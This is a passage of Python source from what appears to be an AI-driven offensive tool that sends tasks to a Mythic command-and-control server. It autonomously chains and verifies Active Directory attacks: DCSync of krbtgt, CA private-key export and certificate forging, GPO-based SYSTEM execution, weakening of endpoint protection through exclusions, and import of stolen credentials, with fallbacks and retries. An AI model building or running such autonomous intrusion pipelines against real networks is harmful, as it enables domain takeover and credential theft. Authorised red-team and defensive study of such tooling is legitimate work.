        intent = dict(intent) if isinstance(intent, dict) else {}
        for key in (
            "capability", "domain", "source_domain", "target_domain", "effect_domain",
            "gpo", "gpo_name", "gponame", "gpo_display_name",
            "account", "user", "rights", "execution_context", "callback_id", "callback",
            "gpo_guid", "guid", "gpo_object_guid", "ldap_server",
            "affected_hosts", "affected_computer_hosts", "affected_computers", "computer_hosts",
            "affected_dc_hosts", "affected_dcs", "dc_hosts",
            "current_host", "callback_host", "foothold_host", "local_host",
            "account_domain", "reader_domain", "principal_domain", "target_host", "host", "computer",
            "domain_controller", "dc", "target_dc", "target_dcs", "target_domain_controller",
            "target_domain_controllers", "search_base", "local_account", "local_user", "proof_resource",
            "service_resource", "target_resource", "proof_path", "proof_unc", "proof_marker",
            "remote_command", "method", "local_realm", "pfx_path", "metadata_path", "pfx_password",
            "certificate_password", "export_marker", "adcs_ca_export_method", "ca_export_method",
            "export_method", "dpapi_tool", "tool", "staged_tool_path", "tool_path", "output_path",
            "command", "arguments", "args", "executable", "task_name", "command_path", "command_arguments",
            "system_command", "system_arguments",
            "controlled_principal", "current_identity", "current_user", "foothold_identity",
            "allow_proof_only", "proof_only",
            "kerberos_ticket_acquisition_strategy", "ticket_acquisition_strategy", "service_ticket_strategy",
            "preferred_effect", "intended_effect", "effect",
            "primary_failure_observed", "sharp_gpo_primary_failed", "sharp_gpo_failed",
            "sharp_gpo_guid_only_noop", "gpo_primary_failed", "gpo_repair_after_primary_failure",
            "fallback_after_primary_failure", "primary_failure", "previous_failure", "failure_reason",
            "fallback_reason", "repair_reason",
            "wait_seconds", "gpo_wait_seconds", "gp_refresh_wait_seconds", "dc_refresh_wait_seconds", "delay_seconds",
            "final_probe_retries", "proof_retry_attempts", "proof_retries",
            "final_probe_retry_delay_seconds", "proof_retry_delay_seconds", "proof_retry_delay",
            "remote_output_path", "local_stage_path", "provider", "endpoint_provider", "endpoint_method",
            "adjustment_method", "actions", "endpoint_actions", "protection_actions", "exclusion_paths",
            "exclusions", "exclusion_path", "adjustment_marker", "ca_host", "ca_pfx_path",
            "ca_cert_path", "ca_certificate_path", "ca_pfx_password", "ca_cert_password",
            "ca_certificate_password", "forged_pfx_path", "forged_certificate_path", "new_cert_path",
            "forged_pfx_password", "forged_certificate_password", "new_cert_password", "subject",
            "certificate_subject", "subject_alt_name", "san", "upn", "auth_marker",
            "certificate_already_forged", "skip_certificate_forge", "pre_forged_certificate",
            "refresh_current_context",
        ):
            if key in data and key not in intent:
                intent[key] = data[key]
            if key in inputs and key not in intent:
                intent[key] = inputs[key]

        name = self._capability_text(
            data.get("name") or data.get("capability") or intent.get("capability") or inputs.get("capability")
        )
        if not name:
            return None
        name = self._canonical_capability_name(name, intent, inputs)
        intent["capability"] = name
        if name == "gpo-controlled-system-exec" and not self._capability_text(
            intent.get("gpo") or intent.get("gpo_name") or intent.get("gponame") or intent.get("gpo_display_name")
        ):
            gpo_guid = self._capability_text(
                intent.get("gpo_guid")
                or intent.get("guid")
                or intent.get("gpo_object_guid")
                or inputs.get("gpo_guid")
                or inputs.get("guid")
                or inputs.get("gpo_object_guid")
            ).strip().strip("{}")
            if gpo_guid:
                intent["gpo"] = gpo_guid.casefold()
        if name == "dcsync-krbtgt" and not self._capability_text(intent.get("account")):
            intent["account"] = "krbtgt"

        raw_target = self._capability_text(data.get("target"))
        if raw_target and "=" not in raw_target:
            if name == "adcs-certificate-auth" and not self._capability_text(intent.get("ca_host")):
                intent["ca_host"] = raw_target
            elif name in {
                "adcs-ca-private-key-export",
                "execute-as-local-admin",
                "use-managed-local-admin-secret",
                "endpoint-protection-adjustment",
            } and not self._capability_text(
                intent.get("target_host") or intent.get("host") or intent.get("computer")
            ):
                intent["target_host"] = raw_target

        target = raw_target or self._default_capability_target(name, intent, inputs)
        if raw_target and "=" not in raw_target:
            target = self._default_capability_target(name, intent, inputs) or raw_target
        preconditions = self._capability_list(data.get("preconditions"))
        effects = self._capability_list(data.get("effects")) or self._default_capability_effects(name, intent, inputs)
        verifier = self._capability_json_value(data.get("verifier"))
        source_facts = self._capability_list(data.get("source_facts"))
        return capabilities_mod.CapabilityAction(
            name=name,
            target=target,
            preconditions=preconditions,
            effects=effects,
            intent=intent,
            verifier=dict(verifier) if isinstance(verifier, dict) else {},
            reason=self._capability_text(data.get("reason")),
            source_facts=source_facts,
        )

    def _canonical_capability_name(self, name: str, intent: dict, inputs: dict) -> str:
        capability = self._capability_text(name).strip()
        normalized = capability.casefold()
        if normalized in {
            "prove-domain-admin-control",
            "prove-administrative-control",
            "domain-admin-control-proof",
            "administrative-control-proof",
            "prove-domain-control",
        }:
            return "ensure-kerberos-context"
        if normalized == "dcsync":
            raw_account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("target_account")
                or intent.get("account") or intent.get("user") or intent.get("target_account")
            ).casefold()
            account = self._canonical_credential_account(raw_account)
            if not account or account == "krbtgt":
                return "dcsync-krbtgt"
            return "dcsync-account"
        return capability

    async def execute_capability(
        self,
        action: Annotated[dict | str, (
            "Capability action to execute end-to-end. Pass a NEXT CAPABILITY ACTION dict "
            "or a compact request such as {\"capability\":\"adcs-certificate-auth\","
            "\"domain\":\"lab.local\",\"account\":\"administrator\",\"callback_id\":\"13\"}."
        )],
        inputs: Annotated[dict | str | None, (
            "Runtime values for the capability. For service-access proof pass proof_host or proof_resource "
            "when BloodHound cannot resolve a domain controller. For adcs-certificate-auth Sage first probes "
            "the current callback context, then stages verified CA PFX material only if needed, builds the "
            "adapter command plan so the payload performs the forge, executes it in order, and records only "
            "after verifier proof."
        )] = None,
    ) -> str:
        """Execute one deterministic generic capability action, verify it, and record only proven effects.

        This is the autonomous path for multi-step capabilities. It uses the same payload-agnostic
        capability action, runtime materializer, Mythic adapter, command issuer, and verifier ledger as
        the transparent build/materialize tools; it just owns sequencing so the model does not have to
        replay a command list by hand. Currently materialization is implemented for
        `adcs-certificate-auth`; other builder-backed capabilities are executed from their adapter plan.
        """
        try:
            if self.client is None:
                return json.dumps({
                    "ok": False,
                    "missing": ["client"],
                    "reason": "MythicAPIClient not initialized. Call login() first.",
                }, sort_keys=True)
            try:
                from . import capabilities
            except ImportError:
                import capabilities

            input_values = self._capability_tool_inputs(inputs)
            action_obj = self._capability_tool_action(action, input_values, capabilities)
            if action_obj is None:
                return json.dumps({
                    "ok": False,
                    "missing": ["action"],
                    "reason": "execute_capability needs a capability action",
                    "issued": [],
                }, sort_keys=True)

            before_effects = self._capability_achieved_effects()
            force_current_refresh = (
                self._capability_input_bool(input_values, "refresh_current_context")
                or self._capability_input_bool(input_values, "force_revalidate")
                or self._capability_input_bool(input_values, "force_refresh")
            )
            if (
                not force_current_refresh
                and self._capability_action_effects_achieved(action_obj, achieved_effects=before_effects)
            ):
                return json.dumps({
                    "ok": True,
                    "verdict": "achieved",
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "reason": "requested capability effect is already achieved in the engagement ledger; no Mythic tasks issued",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "issued": [],
                    "proof_chain": self._capability_existing_effect_proofs(action_obj),
                    "recorded_effects": [],
                    "achieved_effects": sorted(before_effects),
                    "stopped_after": "already_achieved",
                }, sort_keys=True)

            await self._augment_capability_runtime_inputs(action_obj, input_values)
            await self._bind_capability_mythic_adapter(action_obj, input_values)
            await self._ensure_capability_executor_proof_target(action_obj, input_values)
            callback_id = self._capability_callback_id(action_obj, input_values)
            if not callback_id:
                return self._capability_executor_failure_json({
                    "ok": False,
                    "verdict": "failed",
                    "missing": ["callback_id"],
                    "reason": "execute_capability needs a target callback id",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "issued": [],
                }, action_obj, input_values, None)

            host_scope_failure = self._capability_host_scoped_precondition_failure(
                action_obj,
                input_values,
                before_effects,
            )
            if host_scope_failure:
                return self._capability_executor_failure_json({
                    "ok": False,
                    "verdict": "failed",
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "reason": host_scope_failure["reason"],
                    "missing": host_scope_failure["missing"],
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "issued": [],
                    "recorded_effects": [],
                }, action_obj, input_values, callback_id)

            artifact_scope_failure = self._capability_artifact_scoped_precondition_failure(
                action_obj,
                input_values,
                before_effects,
            )
            if artifact_scope_failure:
                return self._capability_executor_failure_json({
                    "ok": False,
                    "verdict": "failed",
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "reason": artifact_scope_failure["reason"],
                    "missing": artifact_scope_failure["missing"],
                    "suggested_capability": artifact_scope_failure.get("suggested_capability"),
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "issued": [],
                    "recorded_effects": [],
                }, action_obj, input_values, callback_id)

            injected_blocker = self._capability_executor_injected_blocker(
                action_obj,
                input_values,
                callback_id,
                capabilities,
            )
            if injected_blocker is not None:
                return injected_blocker

            timeout = self._capability_executor_timeout(input_values)
            all_issued: list[dict] = []
            materialized_payload: dict | None = None
            accumulated_probe: dict = {}

            context_check = await self._execute_capability_account_context_prerequisite(
                action_obj,
                input_values,
                int(callback_id),
                timeout,
                capabilities,
            )
            all_issued.extend(context_check.get("issued", []))
            if context_check.get("status") == "failed":
                return self._capability_executor_failure_json({
                    "ok": False,
                    "verdict": context_check.get("verdict") or "failed",
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "reason": context_check.get("reason") or "required account Kerberos context is not usable",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "issued": self._capability_executor_public_issued(all_issued),
                    "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                }, action_obj, input_values, callback_id, issued=all_issued)

            preflight = await self._execute_capability_current_context_preflight(
                action_obj,
                input_values,
                int(callback_id),
                timeout,
                capabilities,
            )
            all_issued.extend(preflight.get("issued", []))
            if preflight.get("status") == "achieved":
                after_effects = self._capability_achieved_effects()
                return json.dumps({
                    "ok": True,
                    "verdict": "achieved",
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "reason": "current callback Kerberos context already proved the capability; no new logon session was created",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "issued": self._capability_executor_public_issued(all_issued),
                    "recorded_effects": sorted(after_effects - before_effects),
                    "achieved_effects": sorted(after_effects),
                    "stopped_after": "current_context_preflight",
                }, sort_keys=True)
            if preflight.get("status") == "failed":
                return self._capability_executor_failure_json({
                    "ok": False,
                    "verdict": preflight.get("verdict") or "failed",
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "reason": preflight.get("reason") or "current-context preflight failed before a capability branch could run",
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "issued": self._capability_executor_public_issued(all_issued),
                    "recorded_effects": [],
                }, action_obj, input_values, callback_id, issued=all_issued)

            if self._capability_needs_runtime_materialization(action_obj, input_values):
                materialized_raw = await self.materialize_capability_inputs(action_obj, input_values)
                try:
                    materialized_payload = json.loads(materialized_raw)
                except Exception:
                    materialized_payload = {
                        "ok": False,
                        "missing": ["materializer"],
                        "reason": materialized_raw,
                    }
                if not isinstance(materialized_payload, dict) or not materialized_payload.get("ok"):
                    return self._capability_executor_failure_json({
                        "ok": False,
                        "verdict": "failed",
                        "capability": self._capability_text(getattr(action_obj, "name", "")),
                        "reason": self._capability_text(
                            (materialized_payload or {}).get("reason")
                            if isinstance(materialized_payload, dict) else "materializer failed"
                        ),
                        "missing": (
                            materialized_payload.get("missing", [])
                            if isinstance(materialized_payload, dict) else ["materializer"]
                        ),
                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                        "issued": self._capability_executor_public_issued(all_issued),
                        "recorded_effects": [],
                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=materialized_payload)
                materialized_inputs = materialized_payload.get("inputs")
                if isinstance(materialized_inputs, dict):
                    input_values.update(materialized_inputs)
                materialized_action = materialized_payload.get("action")
                if isinstance(materialized_action, dict):
                    action_obj = self._capability_tool_action(materialized_action, input_values, capabilities) or action_obj
                await self._augment_capability_runtime_inputs(action_obj, input_values)
                await self._bind_capability_mythic_adapter(action_obj, input_values)
                await self._ensure_capability_executor_proof_target(action_obj, input_values)

            build_payload = await self._capability_build_command_payload(action_obj, input_values)
            if not build_payload.get("ok"):
                return self._capability_executor_failure_json({
                    "ok": False,
                    "verdict": "failed",
                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                    "reason": build_payload.get("reason") or "capability command build failed",
                    "missing": build_payload.get("missing", []),
                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
                    "issued": self._capability_executor_public_issued(all_issued),
                    "recorded_effects": [],
                }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)

            transaction = self._capability_transaction_start(action_obj, build_payload)
            # The current-context preflight heuristic only legitimately applies to the REDUNDANT LEADING probe
            # steps (inventory + access-check) that the separate preflight already ran. It is position-agnostic,
            # so it also matches core post-forge steps that touch the current Kerberos context (the current-TGT
            # import, purge, and post-import inventory). Skipping those would drop the imported Kerberos context
            # and collapse the cross-domain chain. Only skip preflight-looking steps until the first core action
            # is issued; never skip a step that follows a non-preflight command.
            # Same-forest child->parent forge: once the EA-capable Kerberos context is imported below, grant the
            # parent DS-Replication right so this chain's own proof DCSync is not pre-blocked. Empty unless
            # cross-domain. The imported artifact is usually the child TGT; Windows obtains referral/service
            # tickets on demand unless the caller explicitly requested an asktgs fallback.
            forge_cross_domain_parent = self._cross_domain_forge_parent(action_obj, input_values)
            core_action_issued = False
            command_objects = list(build_payload.get("commands") or [])
            for command_index, command_obj in enumerate(command_objects):
                is_current_context_preflight = self._capability_executor_is_current_context_preflight(command_obj)
                refresh_current_context = (
                    self._capability_input_bool(input_values, "refresh_current_context")
                    or self._capability_input_bool(getattr(action_obj, "intent", {}), "refresh_current_context")
                )
                if self._capability_executor_should_skip_leading_preflight(
                    is_current_context_preflight,
                    preflight_ran=bool(preflight.get("ran")),
                    refresh_current_context=bool(refresh_current_context),
                    core_action_issued=core_action_issued,
                ):
                    continue
                if not is_current_context_preflight:
                    core_action_issued = True
                unresolved = self._capability_executor_unresolved_placeholders(command_obj)
                if unresolved:
                    return self._capability_executor_failure_json({
                        "ok": False,
                        "verdict": "failed",
                        "capability": self._capability_text(getattr(action_obj, "name", "")),
                        "reason": "capability command still has unresolved runtime placeholders",
                        "missing": sorted(unresolved),
                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
                        "issued": self._capability_executor_public_issued(all_issued),
                        "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)

                issued_item = await self._execute_capability_command(
                    command_obj,
                    int(callback_id),
                    timeout,
                    capability_name=self._capability_text(getattr(action_obj, "name", "")),
                )
                all_issued.append(issued_item)
                if (
                    forge_cross_domain_parent
                    and "kerberos_ticket_imported" in (command_obj.get("produces") or [])
                    and not self._capability_executor_task_failed(issued_item)
                    and forge_cross_domain_parent not in self._cross_domain_replication_rights
                ):
                    self._cross_domain_replication_rights.add(forge_cross_domain_parent)
                    try:
                        logger.info(
                            "🔑 cross-domain replication-rights GRANTED for %s (EA-capable Kerberos context imported)",
                            forge_cross_domain_parent,
                        )
                    except Exception:
                        pass
                output = self._capability_text(issued_item.get("_output"))
                self._capability_transaction_update_artifact(transaction, command_obj, output, capabilities)
                if self._capability_transaction_is_blocked(transaction):
                    fallback_result = await self._capability_executor_try_gpo_artifact_fallback(
                        action_obj,
                        input_values,
                        int(callback_id),
                        timeout,
                        before_effects,
                        all_issued,
                        materialized_payload,
                        transaction,
                    )
                    if fallback_result is not None:
                        return fallback_result
                    fallback_result = await self._capability_executor_try_schannel_fallback(
                        action_obj,
                        input_values,
                        int(callback_id),
                        timeout,
                        capabilities,
                        before_effects,
                        all_issued,
                        materialized_payload,
                        transaction,
                        output,
                    )
                    if fallback_result is not None:
                        return fallback_result
                    return self._capability_executor_failure_json({
                        "ok": False,
                        "verdict": "blocked",
                        "capability": self._capability_text(getattr(action_obj, "name", "")),
                        "reason": self._capability_transaction_failure_reason(transaction, "capability transaction blocked"),
                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
                        "issued": self._capability_executor_public_issued(all_issued),
                        "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                        "transaction": transaction,
                        "stopped_after": transaction.get("status") or "artifact_validation",
                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)
                probe, verification = self._capability_executor_verify_output(
                    action_obj,
                    input_values,
                    int(callback_id),
                    output,
                    command_obj,
                    capabilities,
                )
                if verification is not None:
                    if probe:
                        accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
                        verification = capabilities.verify_capability(
                            self._capability_text(getattr(action_obj, "name", "")),
                            accumulated_probe,
                        )
                        probe = dict(accumulated_probe)
                    issued_item["verify_verdict"] = verification.verdict
                    issued_item["verify_reason"] = verification.reason
                    self._capability_transaction_update_verification(transaction, command_obj, verification)
                    final_probe = self._capability_executor_is_final_probe(command_obj)
                    if verification.verdict == "achieved" and final_probe:
                        cleanup_issued = await self._capability_executor_run_trailing_cleanup_commands(
                            command_objects,
                            command_index,
                            int(callback_id),
                            timeout,
                            capability_name=self._capability_text(getattr(action_obj, "name", "")),
                        )
                        all_issued.extend(cleanup_issued)
                        self._record_verified_account_kerberos_context(
                            action_obj,
                            input_values,
                            callback_id,
                        )
                        credential_refs = await self._import_capability_credential_material(
                            action_obj,
                            input_values,
                            output,
                            issued_item.get("task_id"),
                        )
                        if not self._capability_action_effects_achieved(action_obj):
                            evidence = {
                                "source": "execute_capability",
                                "provenance": "run",
                                "mythic_task_id": issued_item.get("task_id"),
                                "callback_id": callback_id,
                                "command": issued_item.get("command"),
                            }
                            evidence.update(self._adcs_ca_export_artifact_evidence(probe))
                            if credential_refs:
                                evidence["credential_material_imported"] = True
                                evidence["credential_store_refs"] = credential_refs
                            self.record_capability_result(
                                action_obj,
                                probe or accumulated_probe or {},
                                evidence=evidence,
                            )
                        after_effects = self._capability_achieved_effects()
                        return json.dumps({
                            "ok": True,
                            "verdict": "achieved",
                            "capability": self._capability_text(getattr(action_obj, "name", "")),
                            "reason": verification.reason,
                            "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                            "materialized": self._capability_executor_materialized_summary(materialized_payload),
                            "issued": self._capability_executor_public_issued(all_issued),
                            "recorded_effects": sorted(after_effects - before_effects),
                            "achieved_effects": sorted(after_effects),
                            "stopped_after": "verified_proof",
                            "transaction": transaction,
                        }, sort_keys=True)
                    if final_probe:
                        retry_attempt = 0
                        max_probe_retries = self._capability_executor_final_probe_retry_limit(input_values, command_obj)
                        while self._capability_should_retry_final_probe(
                            command_obj,
                            probe or {},
                            verification,
                            retry_attempt,
                            max_probe_retries,
                        ):
                            retry_attempt += 1
                            retry_delay = self._capability_executor_final_probe_retry_delay(input_values, command_obj)
                            if retry_delay > 0:
                                await asyncio.sleep(retry_delay)
                            retry_item = await self._execute_capability_command(
                                command_obj,
                                int(callback_id),
                                timeout,
                                capability_name=self._capability_text(getattr(action_obj, "name", "")),
                            )
                            retry_item["retry_attempt"] = retry_attempt
                            retry_item["retry_reason"] = "final proof was not available yet"
                            if issued_item.get("task_id"):
                                retry_item["retry_of_task_id"] = issued_item.get("task_id")
                            all_issued.append(retry_item)
                            retry_output = self._capability_text(retry_item.get("_output"))
                            self._capability_transaction_update_artifact(transaction, command_obj, retry_output, capabilities)
                            if self._capability_transaction_is_blocked(transaction):
                                return self._capability_executor_failure_json({
                                    "ok": False,
                                    "verdict": "blocked",
                                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                                    "reason": self._capability_transaction_failure_reason(transaction, "capability transaction blocked"),
                                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
                                    "issued": self._capability_executor_public_issued(all_issued),
                                    "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                                    "transaction": transaction,
                                    "stopped_after": transaction.get("status") or "artifact_validation",
                                }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)
                            retry_probe, retry_verification = self._capability_executor_verify_output(
                                action_obj,
                                input_values,
                                int(callback_id),
                                retry_output,
                                command_obj,
                                capabilities,
                            )
                            if retry_verification is None:
                                break
                            if retry_probe:
                                accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, retry_probe)
                                retry_verification = capabilities.verify_capability(
                                    self._capability_text(getattr(action_obj, "name", "")),
                                    accumulated_probe,
                                )
                                retry_probe = dict(accumulated_probe)
                            retry_item["verify_verdict"] = retry_verification.verdict
                            retry_item["verify_reason"] = retry_verification.reason
                            self._capability_transaction_update_verification(transaction, command_obj, retry_verification)
                            issued_item = retry_item
                            output = retry_output
                            probe = retry_probe
                            verification = retry_verification
                            if retry_verification.verdict == "achieved":
                                cleanup_issued = await self._capability_executor_run_trailing_cleanup_commands(
                                    command_objects,
                                    command_index,
                                    int(callback_id),
                                    timeout,
                                    capability_name=self._capability_text(getattr(action_obj, "name", "")),
                                )
                                all_issued.extend(cleanup_issued)
                                self._record_verified_account_kerberos_context(
                                    action_obj,
                                    input_values,
                                    callback_id,
                                )
                                credential_refs = await self._import_capability_credential_material(
                                    action_obj,
                                    input_values,
                                    retry_output,
                                    retry_item.get("task_id"),
                                )
                                if not self._capability_action_effects_achieved(action_obj):
                                    evidence = {
                                        "source": "execute_capability",
                                        "provenance": "run",
                                        "mythic_task_id": retry_item.get("task_id"),
                                        "callback_id": callback_id,
                                        "command": retry_item.get("command"),
                                    }
                                    evidence.update(self._adcs_ca_export_artifact_evidence(retry_probe))
                                    if credential_refs:
                                        evidence["credential_material_imported"] = True
                                        evidence["credential_store_refs"] = credential_refs
                                    self.record_capability_result(
                                        action_obj,
                                        retry_probe or accumulated_probe or {},
                                        evidence=evidence,
                                    )
                                after_effects = self._capability_achieved_effects()
                                return json.dumps({
                                    "ok": True,
                                    "verdict": "achieved",
                                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                                    "reason": retry_verification.reason,
                                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
                                    "issued": self._capability_executor_public_issued(all_issued),
                                    "recorded_effects": sorted(after_effects - before_effects),
                                    "achieved_effects": sorted(after_effects),
                                    "stopped_after": "verified_proof",
                                    "transaction": transaction,
                                }, sort_keys=True)
                        if self._capability_should_retry_adcs_dpapi(action_obj, input_values, verification):
                            retry_inputs = dict(input_values)
                            retry_inputs["adcs_ca_export_method"] = "sharpdpapi"
                            retry_inputs["adcs_ca_export_command"] = (
                                retry_inputs.get("adcs_ca_dpapi_export_command")
                                or retry_inputs.get("dpapi_export_command")
                                or "powerpick"
                            )
                            retry_inputs["adcs_ca_export_use_current_context"] = False
                            retry_inputs["adcs_dpapi_retry_attempted"] = True
                            retry_inputs["native_export_blocker"] = verification.reason
                            retry_raw = await self.execute_capability(action_obj, retry_inputs)
                            try:
                                retry_payload = json.loads(retry_raw)
                            except Exception:
                                retry_payload = {
                                    "ok": False,
                                    "verdict": "failed",
                                    "capability": self._capability_text(getattr(action_obj, "name", "")),
                                    "reason": self._capability_text(retry_raw),
                                    "issued": [],
                                    "recorded_effects": [],
                                }
                            if isinstance(retry_payload, dict):
                                retry_issued = retry_payload.get("issued") if isinstance(retry_payload.get("issued"), list) else []
                                retry_payload["issued"] = self._capability_executor_public_issued(all_issued) + retry_issued
                                retry_payload["native_export_repair"] = "sharpdpapi"
                                retry_payload["native_export_blocker"] = verification.reason
                                return json.dumps(retry_payload, sort_keys=True)
                        fallback_result = await self._capability_executor_try_schannel_fallback(
                            action_obj,
                            input_values,
                            int(callback_id),
                            timeout,
                            capabilities,
                            before_effects,
                            all_issued,
                            materialized_payload,
                            transaction,
                            output,
                        )
                        if fallback_result is not None:
                            return fallback_result
                        return self._capability_executor_failure_json({
                            "ok": False,
                            "verdict": verification.verdict,
                            "capability": self._capability_text(getattr(action_obj, "name", "")),
                            "reason": verification.reason,
                            "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                            "materialized": self._capability_executor_materialized_summary(materialized_payload),
                            "issued": self._capability_executor_public_issued(all_issued),
                            "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                            "transaction": transaction,
                            "stopped_after": "unresolved_effect_transaction",
                        }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload,
                            record_failed=True, failure_probe=probe or accumulated_probe or {})

                if self._capability_executor_task_failed(issued_item):
                    self._capability_transaction_record_task_failure(transaction, command_obj, issued_item)
                    fallback_result = await self._capability_executor_try_schannel_fallback(
                        action_obj,
                        input_values,
                        int(callback_id),
                        timeout,
                        capabilities,
                        before_effects,
                        all_issued,
                        materialized_payload,
                        transaction,
                        output,
                    )
                    if fallback_result is not None:
                        return fallback_result
                    return self._capability_executor_failure_json({
                        "ok": False,
                        "verdict": "failed",
                        "capability": self._capability_text(getattr(action_obj, "name", "")),
                        "reason": issued_item.get("failure_reason") or "capability command failed",
                        "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
                        "issued": self._capability_executor_public_issued(all_issued),
                        "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
                        "transaction": transaction,
                    }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload,
                        record_failed=True, failure_probe=accumulated_probe or {})

            after_effects = self._capability_achieved_effects()
            action_ok = self._capability_action_effects_achieved(action_obj)
            final_payload = {
                "ok": bool(action_ok),
                "verdict": "achieved" if action_ok else "partial",
                "capability": self._capability_text(getattr(action_obj, "name", "")),
                "reason": (
                    "capability effects are achieved in the ledger"
                    if action_ok else
                    "capability command plan completed, but verifier did not record an achieved effect"
                ),
                "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                "materialized": self._capability_executor_materialized_summary(materialized_payload),
                "issued": self._capability_executor_public_issued(all_issued),
                "recorded_effects": sorted(after_effects - before_effects),
                "achieved_effects": sorted(after_effects),
                "transaction": transaction,
            }
            if not action_ok:
                self._capability_transaction_mark_unverified(
                    transaction,
                    "capability command plan completed, but required effects were not verified",
                )
                final_payload["stopped_after"] = "unresolved_effect_transaction"
                return self._capability_executor_failure_json(
                    final_payload,
                    action_obj,
                    input_values,
                    callback_id,
                    issued=all_issued,
                    build_payload=build_payload,
                    record_failed=True,
                    failure_probe=accumulated_probe or {},
                )
            return json.dumps(final_payload, sort_keys=True)
        except Exception as exc:
            return self._capability_executor_failure_json({
                "ok": False,
                "verdict": "failed",
                "missing": ["executor"],
                "reason": str(exc),
                "issued": [],
            }, {}, {}, None, reason=str(exc), issued=[])

    def _capability_executor_injected_blocker(
        self,
        action,
        inputs: dict,
        callback_id: str | int | None,
        capabilities_mod,
    ) -> str | None:
        """Return one explicit eval-only verifier blocker when configured by the harness."""
        raw = self._capability_text(os.environ.get("SAGE_EVAL_INJECT_CAPABILITY_BLOCKER_JSON")).strip()
        if not raw:
            return None
        try:
            decoded = json.loads(raw)
        except Exception:
            return None
        specs = decoded if isinstance(decoded, list) else [decoded]
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        target = self._capability_text(getattr(action, "target", "")).casefold()
        for spec in specs:
            if not isinstance(spec, dict):
                continue
            if self._capability_text(spec.get("capability")).casefold() != capability:
                continue
            target_contains = self._capability_text(spec.get("target_contains")).casefold()
            if target_contains and target_contains not in target:
                continue
            skip_effects = spec.get("skip_if_achieved_effects")
            if not isinstance(skip_effects, list):
                skip_effects = [spec.get("skip_if_achieved_effect")]
            achieved_effects = self._capability_achieved_effects()
            if any(
                self._canonical_capability_effect(effect) in achieved_effects
                for effect in skip_effects
                if self._capability_text(effect)
            ):
                continue
            probe = dict(spec.get("probe") or {}) if isinstance(spec.get("probe"), dict) else {}
            if not probe:
                continue
            verification = capabilities_mod.verify_capability(capability, probe)
            if self._capability_text(getattr(verification, "verdict", "")).casefold() != "blocked":
                continue
            reason = self._capability_text(spec.get("reason") or getattr(verification, "reason", "")).strip()
            if not reason:
                reason = "eval-injected capability blocker"
            failure_class = self._capability_text(spec.get("failure_class")).casefold()
            if failure_class not in {"construction", "genuine", "transient"}:
                failure_class = "genuine"
            return self._capability_executor_failure_json({
                "ok": False,
                "verdict": "blocked",
                "capability": capability,
                "reason": reason,
                "failure_class": failure_class,
                "record_failed_effect": self._capability_text(spec.get("record_failed_effect")).strip(),
                "action": asdict(action) if is_dataclass(action) else {},
                "issued": [],
                "recorded_effects": [],
                "stopped_after": "eval_injected_blocker",
                "eval_injected_blocker": True,
            }, action, inputs, callback_id, record_failed=True, failure_probe=probe)
        return None

    async def materialize_capability_inputs(
        self,
        action: Annotated[dict | str, (
            "Capability action that needs runtime artifacts before build_capability_commands. "
            "Currently supports adcs-certificate-auth actions rendered by the engagement planner."
        )],
        inputs: Annotated[dict | str | None, (
            "Optional runtime values. For adcs-certificate-auth include callback_id/domain/account/ca_host "
            "when not already in the action. Optional overrides: ca_pfx_password, remote_ca_pfx_path, "
            "forged_pfx_password, forged_pfx_path, upload_command, upload_file_param, upload_path_param, timeout."
        )] = None,
    ) -> str:
        """Prepare runtime artifacts for a generic capability and return builder-ready inputs.

        This tool may issue staging tasks. For `adcs-certificate-auth`, Sage resolves a verified
        `adcs-ca-private-key:<ca>@<domain>` PFX artifact from the durable ledger, registers that
        verified CA PFX in Mythic, uploads it to the selected callback, and returns inputs for
        `build_capability_commands`. The payload adapter must perform the target-account certificate
        forge through Mythic tasking; Sage never forges the account certificate locally.
        """
        try:
            if self.client is None:
                return json.dumps({
                    "ok": False,
                    "missing": ["client"],
